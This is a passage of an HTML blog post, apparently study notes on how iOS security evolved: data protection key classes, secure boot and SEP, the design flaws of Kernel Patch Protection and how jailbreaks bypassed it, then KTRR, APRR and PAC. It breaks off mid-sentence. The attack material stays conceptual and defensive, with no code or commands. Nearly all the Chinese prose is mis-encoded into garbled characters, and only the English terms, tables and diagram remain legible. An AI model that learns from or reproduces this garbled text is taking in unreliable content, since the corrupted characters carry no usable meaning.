ç§»åŠ¨äº’è”ç½‘/æ™ºèƒ½æ‰‹æœºå¤§çˆ†å‘</h3><p>ç›®ç¹äº†æ¡Œé¢æ“ä½œç³»ç»Ÿçš„ä¹±è±¡åï¼ŒAppleåœ¨iOSç³»ç»Ÿä¸­å¼€å§‹åˆ›æ–°ä¸å˜é©ã€‚</p><p>é—®é¢˜ï¼šå¦‚ä½•æ ¹æ²»PCæ—¶ä»£çš„æ¯’ç˜¤ï¼Ÿ</p><p>iOSåˆæœŸå®‰å…¨å»ºè®¾ä¸‰é©¾é©¬è½¦</p><ul><li>å¯ä¿¡å¯åŠ¨ -&gt; ç¡®ä¿å†…æ ¸å¯åŠ¨å®Œæ•´æ€§ï¼Œä¸”ä¸å¯é™çº§</li><li>App Store + å¼ºåˆ¶ä»£ç ç­¾å -&gt; å„æ–­Appåˆ†å‘æ¸ é“ï¼ˆé€šè¿‡æŠ€æœ¯æ‰‹æ®µå·©å›ºåœ°ä½ï¼‰</li><li>åº”ç”¨æ²™ç›’ -&gt; é™åˆ¶Appèƒ½åŠ›</li></ul><p>ç»“æœï¼šæ¶æ„ä»£ç åŸºæœ¬æ¶ˆå¤±ï¼Œè½¯ä»¶å¼€å‘è€…çš„æƒç›Šå¾—åˆ°ä¸€å®šä¿éšœï¼Œç”Ÿæ€é€æ¸ç¹è£</p><p><strong>ç³»ç»Ÿå®‰å…¨å»ºè®¾æˆä¸ºAppleç”Ÿæ€çš„åŸºçŸ³</strong></p><p>æ–°å®‰å…¨éœ€æ±‚ä¸æ–­æ¶Œç°ï¼šç§»åŠ¨è®¾å¤‡æ‰¿è½½äº†å¤§é‡ä¸ªäººæ•°æ®ï¼Œé—å¤±é—®é¢˜æˆä¸ºç”¨æˆ·ç—›ç‚¹ï¼Œå¦‚ä½•ä¿éšœé—å¤±æ‰‹æœºçš„æ•°æ®å®‰å…¨ï¼Ÿï¼ˆéšç§é—®é¢˜å¼€å§‹å‡ºç°ï¼‰</p><p>iOS4çš„æ•°æ®å±‚çº§ä¿æŠ¤ï¼Œåˆ†æˆAã€Bã€Cã€Då››ç±»å¯†é’¥ç®¡ç†ï¼Œå®ç°æ•°æ®çš„ä¸¥æ ¼ä¿æŠ¤ã€‚</p><table><thead><tr><th>Class</th><th>Description</th></tr></thead><tbody><tr><td>Aï¼ˆ256bit AESï¼‰</td><td>åªæœ‰è§£é”çŠ¶æ€æ‰èƒ½ä½¿ç”¨</td></tr><tr><td>Bï¼ˆCurve 25519ï¼‰</td><td>å…¬é’¥ä¸€ç›´å¯ç”¨ï¼Œç§é’¥åªèƒ½è§£é”çŠ¶æ€ä½¿ç”¨</td></tr><tr><td>Cï¼ˆ256bit AESï¼‰</td><td>å¯åŠ¨åç”¨æˆ·è‡³å°‘è§£é”æ‰‹æœºä¸€æ¬¡æ‰å¯ä½¿ç”¨</td></tr><tr><td>Dï¼ˆ256bit AESï¼‰</td><td>ä¸€ç›´å¯ç”¨</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+                            +----------------------+</span><br><span class="line">|                   |                            |                      |</span><br><span class="line">|                   +---------------------------&gt;+    File System Key   |</span><br><span class="line">|  Hardware Key     |                            |                      |</span><br><span class="line">|                   |                            +----------+-----------+</span><br><span class="line">|                   |                                       |</span><br><span class="line">|                   |    +------------------+    +----------v-----------+     +-------------------+</span><br><span class="line">|                   +---&gt;+                P |    |                    P |     |                 P |</span><br><span class="line">+-------------------+    |                  |    |    File Metadata     |     |                   |</span><br><span class="line">                         |   Class Key      +---&gt;+   +---------------+  +----&gt;+                   |</span><br><span class="line">+-------------------+    |                  |    |   |               |  |     |   File Contents   |</span><br><span class="line">|                   +---&gt;+                  |    |   | File Key      |  |     |                   |</span><br><span class="line">|                   |    |                  |    |   +---------------+  |     |                   |</span><br><span class="line">|  Passcode Key     |    +------------------+    +----------------------+     +-------------------+</span><br><span class="line">|                   |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºæ–‡ä»¶æ—¶ä¼šéšæœºç”ŸæˆFile Keyï¼ŒFile Keyä¿æŠ¤æ–‡ä»¶å†…å®¹ã€‚<br>ä¸Šé¢å››ç±»Class Keyä¿æŠ¤æ–‡ä»¶çš„File Keyã€‚<br>Class Keyè¢«ç¡¬ä»¶Keyå’Œä¸€ä¸ªPasscode KeyåŒæ—¶ä¿æŠ¤ã€‚<br>File System Keyä¿æŠ¤File Metadataï¼ˆæ–‡ä»¶å¤´ä»¥åŠåŠ å¯†åçš„File keyï¼‰ã€‚</p><p>File System Keyæ²¡æœ‰å—åˆ°ä¿æŠ¤ï¼Œä½†å®ƒå­˜åœ¨çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿè‹¹æœæ¯”è¾ƒå–å·§çš„é€šè¿‡File System Keyæ¥æ ‡è®°æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ¶ˆé™¤æ•°æ®æ—¶ç›´æ¥åˆ keyå°±è¡Œã€‚</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><table><thead><tr><th>æ—¶é—´</th><th>é˜¶æ®µ</th><th>å…¸å‹å®‰å…¨éœ€æ±‚</th><th>å…¸å‹ç ”ç©¶æˆæœ/å®è·µ</th></tr></thead><tbody><tr><td>1970-1980</td><td>OSåŸºç¡€ç†è®ºæ¨¡å‹å¤§å‘å±•</td><td>è®¡ç®—æœºèƒ½å¦åœ¨å†›äº‹é¢†åŸŸåº”ç”¨</td><td>CIAä¸‰å…ƒç»„ã€Reference Monitoræ¦‚å¿µã€BLPå’ŒBibaæ¨¡å‹</td></tr><tr><td>1980-2000</td><td>æœåŠ¡å™¨æ—¶ä»£</td><td>å¤šç”¨æˆ·éš”ç¦»</td><td>ç”¨æˆ·æ€å†…æ ¸æ€å±‚çº§éš”ç¦»ã€å¼ºåˆ¶/è‡ªä¸»è®¿é—®æ§åˆ¶</td></tr><tr><td>2000-2010</td><td>ä¸ªäººç”µè„‘æ—¶ä»£</td><td>æ¶æ„ä»£ç </td><td>è™šæ‹Ÿæœºã€å¯ä¿¡è®¡ç®—</td></tr><tr><td>2010-2020</td><td>ç§»åŠ¨è®¾å¤‡æ—¶ä»£</td><td>éšç§ä¸æ•°æ®ä¿æŠ¤</td><td>åº”ç”¨æ²™ç›’ã€æ•°æ®å±‚çº§ä¿æŠ¤</td></tr></tbody></table><p>ä»è‹¹æœçš„ä¾‹å­ä¸­èƒ½å¤Ÿå‘ç°ï¼Œå¥½çš„å®‰å…¨æ¶æ„æ˜¯èƒ½å¤Ÿå¸¦åŠ¨ä¸šåŠ¡å¢é•¿ã€‚</p><h2 id="é˜´äº‘ä¸æ•£çš„å¹½çµâ€”â€”æ¼æ´"><a href="#é˜´äº‘ä¸æ•£çš„å¹½çµâ€”â€”æ¼æ´" class="headerlink" title="é˜´äº‘ä¸æ•£çš„å¹½çµâ€”â€”æ¼æ´"></a>é˜´äº‘ä¸æ•£çš„å¹½çµâ€”â€”æ¼æ´</h2><p>ä»¥ä¸ºæ¼æ´åªæ˜¯æ‰“ä¸ªpatchè€Œå·²ï¼Œä½†æ²¡æƒ³åˆ°æˆä¸ºæ•´ä¸ªè¡Œä¸šçš„ç—›ç‚¹ã€‚æ¼æ´æŒ‡ä¿¡æ¯ç³»ç»Ÿåœ¨è®¾è®¡ã€å®ç°ã€éƒ¨ç½²ã€ç®¡ç†ç­‰ç¯èŠ‚ä¸­çš„ç¼ºé™·ï¼Œè¢«æ”»å‡»åˆ©ç”¨åå¯å¯¼è‡´ä¿¡æ¯ç³»ç»Ÿè¿èƒŒåŸæœ‰å®‰å…¨ç­–ç•¥ã€‚</p><p>åˆ©ç”¨ç½‘ç»œæœåŠ¡ç»„ä»¶ä¸­çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è½»æ˜“è¿œç¨‹è·å–è®¡ç®—æœºè®¾å¤‡çš„æ§åˆ¶æƒã€‚å¢™ä¸Šçš„å°æ´ï¼Œè®©æ”»å‡»è€…å…·å¤‡ç©¿å¢™æœ¯ï¼Œéš”ç¦»+æ§åˆ¶çš„åŸºæœ¬å®‰å…¨æ¡†æ¶å—åˆ°ä¸¥å³»æŒ‘æˆ˜ã€‚</p><p>æ¼æ´æˆå› å¹¿æ³›ï¼Œå½¢æ€å¤æ‚ï¼Œåˆ©ç”¨æ‰‹æ®µå¤šæ ·ã€‚</p><p>è½¯ä»¶ï¼š</p><ul><li>å†…å­˜å®‰å…¨æ¼æ´ 70%</li><li>é€»è¾‘ç±»å‹åŠå…¶ä»– 30%</li></ul><p>ç¡¬ä»¶ï¼š</p><ul><li>Rowhammer</li><li>Meltdown</li></ul><p>æ€è€ƒï¼šSoCæ˜¯ç¡¬ä»¶æ¼æ´ï¼Ÿè½¯ä»¶æ¼æ´ï¼Ÿå¦‚æœå®šä½ä¸ºè½¯ä»¶æ¼æ´ï¼Œä½†å®ƒæ˜¯å›ºåŒ–åœ¨èŠ¯ç‰‡ä¸­ï¼Œæ— æ³•é€šè¿‡å‡çº§è§£å†³é—®é¢˜</p><p>å†…å­˜å®‰å…¨æ¼æ´ï¼šuafã€ç±»å‹æ··æ·†ã€æº¢å‡ºå†™ã€è¶Šç•Œè¯»ã€æœªåˆå§‹åŒ–ç­‰ã€‚æ„é€ æ“ä½œåŸè¯­ï¼š</p><ul><li>éæ³•è¯»</li><li>éæ³•å†™</li><li>éæ³•æ‰§è¡Œ</li></ul><p>è¿™ä¸‰è€…è¿˜èƒ½äº’ç›¸è½¬æ¢ï¼Œæœ€åæ„é€ å‡ºç ´åå®‰å…¨ç­–ç•¥çš„æ¶æ„åˆ©ç”¨ã€‚</p><p>ç°åœ¨å¤§éƒ¨åˆ†è¿˜å­˜åœ¨å¤šå±‚éš”ç¦»ï¼Œæœ€å°åŒ–ä¿¡ä»»è¾¹ç•Œã€æ‹‰é•¿æ¼æ´æ”»å‡»é“¾ã€‚</p><p>æ¯”å¦‚ç°åœ¨è¦å®Œæˆä¸€ä¸ªRCEæ¼æ´åˆ©ç”¨ï¼šæŸç¨‹åºå†…éƒ¨RCE+æ²™ç®±é€ƒé€¸+æƒé™æå‡+ä¿¡æ¯æ³„éœ²ã€‚</p><p>åˆ©ç”¨æ¼æ´çªç ´iOSé˜²æŠ¤æˆä¸ºæ–°å¨èƒï¼š</p><ul><li>BootRomæ¼æ´åŠ è½½å®šåˆ¶åŒ–çš„å†…æ ¸ï¼Œç›´æ¥æ‰“ç ´iOSç¡¬ä»¶å¯ä¿¡é“¾</li><li>è¶Šç‹±ç›´æ¥å¨èƒApp Storeå„æ–­åœ°ä½</li><li>é€ƒè¿‡æ²™ç›’çªƒå–ç”¨æˆ·éšç§</li></ul><p>æ•´ä¸ªè¡Œä¸šåœ¨ç„¦è™‘æ¼æ´æ²»ç†æ–¹é¢çš„é—®é¢˜ï¼š</p><ul><li>å¦‚ä½•åœ¨æ–°è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­æ¶ˆé™¤æ¼æ´ï¼Ÿè¿ç”¨æ–°çš„è¯­è¨€æœºåˆ¶ä¾‹å¦‚è‹¹æœSwiftå’Œå®‰å“Kotlin</li><li>å¦‚ä½•åœ¨ç°æœ‰è½¯ä»¶ä»£ç ä¸­å‘ç°æ¼æ´ï¼ŸåŠ¨æ€fuzzï¼Œé™æ€ä»£ç åˆ†æï¼Œäººå·¥å®¡è®¡</li><li>å¦‚ä½•åœ¨ä»£ç ç¼–è¯‘é˜¶æ®µå¢å¼ºä»£ç å®‰å…¨æ€§ï¼Ÿæœ€ç»å…¸çš„canaryï¼Œä»¥åŠllvmæ¨¡å—</li><li>å¦‚ä½•åœ¨è½¯ä»¶è¿è¡Œé˜¶æ®µé˜»æ–­æ¼æ´åˆ©ç”¨ï¼Ÿæ›´å¥½çš„å†…å­˜ç®¡ç†æ–¹æ¡ˆï¼Œä½¿å¾—æ¼æ´è¢«è§¦å‘ä¹Ÿéš¾ä»¥åˆ©ç”¨</li><li>å¦‚ä½•é™ä½è½¯ä»¶è¢«æ”»å‡»åç»™æ•´ä¸ªç³»ç»Ÿå¸¦æ¥çš„ç ´åï¼Ÿæœ‰æ•ˆçš„éš”ç¦»æ–¹æ¡ˆ</li></ul><h2 id="iOSå®‰å…¨æ¶æ„æ¼”åŒ–è¿‡ç¨‹"><a href="#iOSå®‰å…¨æ¶æ„æ¼”åŒ–è¿‡ç¨‹" class="headerlink" title="iOSå®‰å…¨æ¶æ„æ¼”åŒ–è¿‡ç¨‹"></a>iOSå®‰å…¨æ¶æ„æ¼”åŒ–è¿‡ç¨‹</h2><h3 id="æ—©æœŸé˜¶æ®µ"><a href="#æ—©æœŸé˜¶æ®µ" class="headerlink" title="æ—©æœŸé˜¶æ®µ"></a>æ—©æœŸé˜¶æ®µ</h3><p>é˜²å¾¡æœºåˆ¶</p><ul><li>å¯ä¿¡å¯åŠ¨</li><li>ä»£ç ç­¾å</li><li>æ•°æ®å±‚çº§ä¿æŠ¤</li><li>ASLRå’ŒKASLR</li><li>SEPï¼ˆç”¨äºå¯†é’¥ç®¡ç†çš„ä¸“ç”¨èŠ¯ç‰‡å¤„ç†å™¨ï¼Œè‡ªå¸¦SEPROMï¼‰</li><li>KPPï¼ˆä¿è¯å†…æ ¸è¿è¡Œæ—¶å®Œæ•´æ€§ï¼‰</li><li>â€¦â€¦</li></ul><p>è‹¹æœåœ¨æ—©æœŸçš„é˜²å¾¡åŸºç¡€ä¸Šåšäº†æ›´è¿›ä¸€æ­¥çš„å®‰å…¨åŠ å›º </p><p>å‚è€ƒblackhat <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Krstic-Behind-The-Scenes-Of-IOS-And-Mas-Security.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Krstic-Behind-The-Scenes-Of-IOS-And-Mas-Security.pdf</a></p><p>å‚è€ƒ è‹¹æœå®‰å…¨ç™½çš®ä¹¦</p><h3 id="æ›´å®‰å…¨çš„å¯ä¿¡å¯åŠ¨"><a href="#æ›´å®‰å…¨çš„å¯ä¿¡å¯åŠ¨" class="headerlink" title="æ›´å®‰å…¨çš„å¯ä¿¡å¯åŠ¨"></a>æ›´å®‰å…¨çš„å¯ä¿¡å¯åŠ¨</h3><p>å®‰å…¨å¯åŠ¨å±äºä»æºå¤´ä¸Šé˜²å®ˆã€‚åœ¨åŸæœ‰å¯ä¿¡å¯åŠ¨çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥åŠ å¼ºã€‚</p><p><strong>å‡å°‘æ”»å‡»é¢ï¼šåœ¨ç¬¬ä¸€æ¬¡è§£é”ä¹‹å‰ç¦æ­¢ä½¿ç”¨usb</strong></p><p>å¼€æœºç¬¬ä¸€æ¬¡è§£é”ä¹‹å‰ï¼ŒUSBæ¥å£åœç”¨ï¼ˆä¸å…è®¸ä»»ä½•USBäº¤äº’ï¼ŒåŒ…æ‹¬å……ç”µï¼‰</p><p>å½±å“ï¼šè™½ç„¶é™ä½äº†ç”¨æˆ·ä½“éªŒï¼Œä½†å°æ€äº†ä¸€ä¸ªå¾ˆå¤§çš„æ”»å‡»é¢ï¼ˆGreyShift è§£é”11.3ä¹‹å‰ç³»ç»Ÿçš„æ¼æ´ï¼‰</p><p><strong>å¯åŠ¨è¿‡ç¨‹ä¸­å®‰å…¨ç¼–è¯‘é€‰é¡¹æ‹‰æ»¡ï¼Œä¿è¯å¯åŠ¨ç¨‹åºä¸å‡ºå†…å­˜é—®é¢˜</strong></p><p>BootROMä½œä¸ºæ ¹åŸºä¾æ¬¡éªŒè¯ä¸‹ä¸€ç¯èŠ‚çš„ç­¾åï¼Œå¤§æ¦‚çš„å¯åŠ¨æµç¨‹åˆ†ä¸ºä¸¤ä¸ªå±‚æ¬¡ï¼š</p><img src="/2022/11/18/ios-system-security-framework-study-1/1.png"><p>ï¼ˆ1ï¼‰APï¼ˆ32ä½ç³»ç»Ÿï¼‰</p><p>ä»SecureROMå¼€å§‹ä¸ºæ ¹åŸºï¼Œå»éªŒè¯LLB/iBootï¼ŒLLB/iBootéªŒè¯iOSå†…æ ¸ï¼ŒiOSå†…æ ¸å†å»éªŒè¯ç”¨æˆ·æ€ç¨‹åºã€‚</p><p>ï¼ˆ2ï¼‰SEPï¼ˆ64ä½ç³»ç»Ÿï¼‰</p><p>SEPå¤„ç†å™¨æ‹¥æœ‰ç‹¬ç«‹çš„å®‰å…¨å¯åŠ¨é“¾</p><p>è‡ªä»iOS14å¼€å§‹ï¼Œè‹¹æœåœ¨A13èŠ¯ç‰‡ï¼ˆiPhone11ï¼‰ä¹‹åçš„æœºå‹ä¸Šï¼Œä½¿ç”¨å¢å¼ºç¼–è¯‘ç»„ä»¶ï¼Œç¡®ä¿iBootä¸­æ²¡æœ‰å†…å­˜æ¼æ´ã€‚ä»£ä»·åˆ™æ˜¯å¯åŠ¨çš„æ€§èƒ½ã€‚</p><img src="/2022/11/18/ios-system-security-framework-study-1/2.png"><ul><li>SEPOSåŸºäºL4å¾®å†…æ ¸</li><li>ç‹¬ç«‹çš„AESå’Œéšæœºæ•°å¼•æ“</li><li>ç‹¬ç«‹I2C Bus</li><li>å®æ—¶å†…å­˜åŠ å¯†</li></ul><p>å®Œå…¨ä¸ä¿¡ä»»APä¾§çš„æ•°æ®ï¼Œå› æ­¤è®¾è®¡å‡ºäº†Memory Protection Engineï¼ŒåŠŸèƒ½ååˆ†å¼ºå¤§ã€‚å†™å…¥APä¾§å…±äº«å†…å­˜ä¸­çš„æ•°æ®ä¼šè¢«åŠ å¯†ï¼Œå¹¶ä¸”æœ‰å®Œæ•´æ€§æ ¡éªŒï¼Œåªæœ‰SEPä¾§å¯ä»¥è§£å¯†ã€‚APä¾§å¦‚æœä¿®æ”¹äº†è¿™æ®µå†…å­˜ä¸­çš„æ•°æ®ï¼Œå¯¼è‡´ä¹‹åçš„å®Œæ•´æ€§æ£€éªŒå¤±è´¥ï¼Œå†…æ ¸ä¼šç›´æ¥panicã€‚</p><p>è¡¥å……ï¼š</p><p>ç›˜å¤å¤§ä½¬ blackhatä¸Šç ”ç©¶è‹¹æœçš„å¯ä¿¡å¯åŠ¨ <a href="https://raw.githubusercontent.com/windknown/presentations/master/Attack_Secure_Boot_of_SEP.pdf" target="_blank" rel="noopener">https://raw.githubusercontent.com/windknown/presentations/master/Attack_Secure_Boot_of_SEP.pdf</a></p><p>åœ¨ä¸Šé¢çš„blackhaté“¾æ¥ä¸­ä»‹ç»äº†è‹¹æœæ–°ä¸€ä»£çš„T2å®‰å…¨èŠ¯ç‰‡ï¼Œä»¥åŠæœ€æ–°çš„å®‰å…¨å¯åŠ¨æµç¨‹ã€‚çœ‹æ ·å­æ˜¯macç”µè„‘çš„å®‰å…¨å¯åŠ¨ï¼Œä¸çŸ¥é“æ‰‹æœºä¼šä¸ä¼šå€Ÿé‰´è¿™ä¸ªæµç¨‹ã€‚</p><img src="/2022/11/18/ios-system-security-framework-study-1/3.png"><h3 id="KTRRå’ŒAPRR"><a href="#KTRRå’ŒAPRR" class="headerlink" title="KTRRå’ŒAPRR"></a>KTRRå’ŒAPRR</h3><p>KTRRå’ŒATRRå±äºè‡ªåº•å‘ä¸Šçš„é˜²å®ˆï¼Œä¸ºäº†è§£å†³KPPçš„ç¼ºç‚¹ã€‚</p><p><strong>KPPï¼ˆKernel Patch Protectionï¼‰</strong></p><p>ä¸€ç§çº¯è½¯ä»¶å®ç°çš„å®‰å…¨æœºåˆ¶ï¼Œä¸»è¦ç›®æ ‡ç”¨äºæ£€æŸ¥å†…æ ¸è¿è¡Œæ—¶çš„å®Œæ•´æ€§ï¼Œä»£ç å®ç°è¿è¡Œåœ¨EL3å±‚ï¼Œç”¨æˆ·æ€ä»£ç åœ¨EL0å±‚ï¼Œå†…æ ¸åœ¨EL1å±‚ã€‚ä¸ºäº†å¢åŠ æ•ˆç‡ï¼Œä»…åœ¨æµ®ç‚¹æ•°è®¡ç®—æ—¶è°ƒç”¨KPPè¿›è¡Œå†…æ ¸å®Œæ•´æ€§æ£€æŸ¥ã€‚FPUï¼ˆåå¤„ç†å™¨ï¼Œç”¨æ¥å¤„ç†æµ®ç‚¹æ•°ï¼‰</p><ul><li>å¯åŠ¨æ—¶ï¼Œå°†å†…æ ¸ä»£ç æ®µä¸åªè¯»å†…å­˜æ®µè¿›è¡Œhashï¼Œå¹¶ç¦ç”¨FPUæ‰§è¡Œæµ®ç‚¹è¿ç®—ã€‚</li><li>EL0/EL1ä½¿ç”¨FPUåè§¦å‘å¼‚å¸¸ï¼ŒEL1å°è¯•å¯ç”¨FPUï¼Œéšåè¿›å…¥EL3ï¼Œåœ¨EL3ä¸­æ£€æŸ¥å†…æ ¸ä»£ç æ®µå’Œåªè¯»æ®µhashæ˜¯å¦å˜åŒ–</li><li>IRQå¼‚å¸¸æ—¶å†æ¬¡è¿›å…¥EL3ï¼Œç¦ç”¨FPU</li></ul><img src="/2022/11/18/ios-system-security-framework-study-1/4.png"><p><strong>KPPå­˜åœ¨çš„è®¾è®¡ç¼ºé™·</strong></p><p>å¹¶ä¸é˜»æ­¢ç¯¡æ”¹å†…æ ¸æœ¬èº«ï¼Œè€Œæ˜¯æ‰¾äº†ä¸€ä¸ªä¸å¤ªå½±å“æ€§èƒ½çš„å…¥å£ç‚¹å»æ£€æµ‹å®Œæ•´æ€§ï¼ˆè°ƒç”¨FPUæŒ‡ä»¤æ—¶ï¼‰ï¼Œå› æ­¤é€ æˆäº†ä¸¤ä¸ªæ”»å‡»ç‚¹ã€‚</p><p>æ”»å‡»ç‚¹1ï¼š</p><ul><li>æ”»å‡»è€…å¯ä¿®æ”¹å†…æ ¸åç«‹å³æ¢å¤ï¼Œå¤§æ¦‚ç‡ä¸ä¼šè§¦å‘KPPæ£€æŸ¥ï¼ˆå‚è€ƒç›˜å¤è¶Šç‹±iOS 9.3.3ï¼‰</li><li>KPPä¾ç„¶å­˜åœ¨ä»·å€¼ï¼Œä½¿å¾—æ”»å‡»å˜å¾—ä¸é‚£ä¹ˆç¨³å®š</li></ul><p>æ”»å‡»ç‚¹2ï¼š</p><ul><li><a href="https://www.cnblogs.com/liqiuhao/p/9450093.html" target="_blank" rel="noopener">TOCTTOUæ”»å‡»</a>ï¼ˆTime-of-check to time-of-useï¼‰ï¼šå†…æ ¸ä¸­å­˜åœ¨å•ä¸€KPPæ£€æŸ¥å…¥å£ï¼Œåœ¨å…¥å£ç‚¹å‰æ¢å¤å†…æ ¸ï¼ŒKPPæ£€æŸ¥å®Œåå†æ¬¡patchå†…æ ¸ã€‚</li><li>å®Œç¾ç»•è¿‡KPPï¼ˆLuca Todesco iOS 10.1.2è¶Šç‹±ï¼‰</li></ul><p>æ€è€ƒï¼šå¦‚æœå°†KPPæ£€æŸ¥ç‚¹æ”¾åœ¨IRQå¼‚å¸¸è€Œä¸æ˜¯è°ƒç”¨FPUå¼‚å¸¸ï¼Œæ˜¯å¦æ•ˆæœä¼šæ›´å¥½ï¼Ÿ</p><p>æœ‰æ²¡æœ‰åŠæ³•åœ¨ç¯¡æ”¹å‘ç”Ÿæ—¶å°±é˜»æ­¢ï¼Œè€Œä¸æ˜¯ä¸»åŠ¨/å®šæ—¶æ£€æµ‹ï¼Ÿè‹¹æœçš„ç­”æ¡ˆå°±æ˜¯KTRR</p><p><strong>KTRRï¼ˆKernel Text Readonly Regionï¼‰</strong></p><p>å¸Œæœ›èƒ½ä»ç¡¬ä»¶å±‚é¢é˜»æ­¢ç¯¡æ”¹å†…æ ¸ä»£ç æ®µå’Œåªè¯»æ®µçš„ä¸€åˆ‡å°è¯•ï¼ŒKPPè¢«å½»åº•æ”¾å¼ƒã€‚</p><p>ç¡¬ä»¶å®ç°ï¼ˆä½œç”¨äºMMUå’ŒIOMMUï¼‰</p><ul><li>è®¾è®¡äº†ä¸‰ä¸ªç³»ç»Ÿå¯„å­˜å™¨<ul><li>ROR Baseï¼šåªè¯»å¯æ‰§è¡Œç‰©ç†åœ°å€èµ·å§‹</li><li>ROR Endï¼šåªè¯»å¯æ‰§è¡Œç‰©ç†åœ°å€ç»“æŸ</li><li>ROR Lockï¼šKTRRå¯ç”¨</li></ul></li><li>éœ€è¦ä¿®æ”¹å†…æ ¸ç‰©ç†å†…å­˜å¸ƒå±€ï¼Œå°†åªè¯»å¯æ‰§è¡Œçš„å†…å®¹æ”¾åœ¨ä¸€èµ·ï¼Œä¸èƒ½å’Œè¯»å†™å†…å­˜äº¤æ›¿</li></ul><p>æ•ˆæœï¼šå‡ ä¹ä¸å¯ç»•è¿‡ï¼ˆæ›¾ç»å‡ºç°è¿‡ä¸¤æ¬¡å…¬å¼€ç»•è¿‡æ¡ˆä¾‹ï¼Œè‹¹æœå¿«é€Ÿä¿®è¡¥ï¼‰å†…æ ¸åªè¯»æ®µåœ¨è¿è¡Œæ—¶æ— æ³•è¢«ä¿®æ”¹ï¼Œå†…æ ¸shellcodeæ— æ³•å®ç°ï¼ŒROPæˆä¸ºå†…æ ¸ä»£ç æ‰§è¡Œçš„å”¯ä¸€æ”»å‡»è·¯å¾„ã€‚</p><p>å¯¹æŠ—ï¼šæ”»å‡»è€…ä½¿ç”¨Patchè¯»å†™æ•°æ®æ®µæ¥ä»£æ›¿Patchå†…æ ¸ï¼Œè¾¾åˆ°ç›¸åŒæˆ–è€…ç±»ä¼¼çš„æ•ˆæœ</p><p>è‹¹æœçš„åº”å¯¹ï¼šå°†æ›´å¤šè¯»å†™æ®µæ•°æ®ç§»åˆ°åªè¯»æ®µï¼Œä½†æ˜¯å­˜åœ¨å·¨å¤§å›°éš¾ç‚¹ã€‚1ï¼‰å¾ˆå¤šæ•°æ®åœ¨ç³»ç»Ÿå¯åŠ¨åè¿˜æ˜¯æœ‰éœ€æ±‚å»æ”¹å†™ï¼Œå³ä¾¿æ²¡æœ‰éœ€æ±‚ï¼Œä¹Ÿæ— æ³•åœ¨ç³»ç»Ÿå¯åŠ¨çš„å‰æœŸå®Œæˆåˆå§‹åŒ–ï¼›2ï¼‰éARMæ ‡å‡†ï¼ŒåæœŸç»´æŠ¤å›°éš¾ã€‚</p><p>KTRRçš„ç¼ºé™·ï¼š</p><ul><li>å¯¹äºåªè¯»æ•°æ®çš„ä¿æŠ¤ï¼Œåªèƒ½è¦†ç›–åˆ°ç³»ç»Ÿæ—©æœŸå¯åŠ¨ï¼ˆMMUåˆå§‹åŒ–å‰ï¼‰æ—¶èƒ½ç¡®å®šä¸‹æ¥çš„å†…å®¹</li><li>ä¸€äº›åæœŸæœ‰éœ€æ±‚ä¿®æ”¹ï¼Œåˆæ˜¯ååˆ†é‡è¦çš„æ•°æ®ï¼Œæ— æ³•ä¿æŠ¤ï¼Œæ— æ³•å¤„ç†Data only attack</li></ul><p>ä¸ºäº†è§£å†³KTRRçš„é—®é¢˜ï¼Œè‹¹æœæå‡ºäº†APRRï¼Œä¸€ä¸ªæ–°çš„ç¡¬ä»¶ç‰¹æ€§ã€‚</p><p><strong>APRRï¼ˆ<a href="https://support.apple.com/guide/security/kernel-integrity-protection-secb1caeb4bc/1/web/1" target="_blank" rel="noopener">Access Permission Restriction Register</a>ï¼‰</strong></p><p>APRRä¿æŠ¤</p><ul><li>é¡µè¡¨</li><li>cdhashï¼ˆä»£ç ç­¾åç™½åå•ï¼‰</li><li>Code Directory Blobï¼ˆè¿›ç¨‹Entitlementæƒé™ç›¸å…³å±æ€§ï¼‰</li></ul><p>APRRå®ç°åŸç†</p><ul><li>å°†å…³é”®æ•°æ®æ‰€åœ¨çš„é¡µè¡¨é¡¹åšäº†ç‰¹æ®Šæ ‡è®°ï¼Œè¿™äº›æ•°æ®åªæœ‰ç‰¹å®šçš„ä»£ç æ®µæ‰æœ‰æƒé™è¿›è¡Œè¯»å†™ç­‰æ“ä½œ</li><li>è¿™äº›ä»£ç æ®µæ‰€åœ¨åœ°å€å½¢æˆä¸€ä¸ªbitmapï¼Œå­˜åœ¨ä¸€ä¸ªè‹¹æœè‡ªå®šä¹‰çš„å¯„å­˜å™¨ä¸­</li><li>è®¾ç½®bitmapçš„gadgetä»…å­˜åœ¨äºPPLTRAMPæ®µçš„ç¬¬ä¸€ä¸ªé¡µä¸­</li></ul><p>æ•ˆæœï¼š</p><ul><li>å…³é”®æ•°æ®ä»…æœ‰PPLTRAMPæ®µçš„ç¬¬ä¸€ä¸ªé¡µä½œä¸ºå…¥å£å»è®¿é—®ï¼Œå¹¶ä¸”gadgetå¾ˆæœ‰é™ -&gt; ç¼“è§£Data only attack</li><li>ä¿®æ”¹å…³é”®æ•°æ®å¿…é¡»å…ˆè·å¾—CPUæ‰§è¡Œæƒé™ -&gt; ROPæˆä¸ºå”¯ä¸€çš„æ”»å‡»æ–¹æ³•</li></ul><h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PACï¼ˆPointer Authentication Codeï¼‰ï¼šARM v8.3çš„æ–°ç‰¹æ€§ã€‚PACå±äºè‡ªåº•å‘ä¸Š+å°é”å…³é”®è·¯å¾„çš„æ€è·¯ã€‚å®ç°åŸç†ï¼š</p><ul><li>åˆ©ç”¨arm64 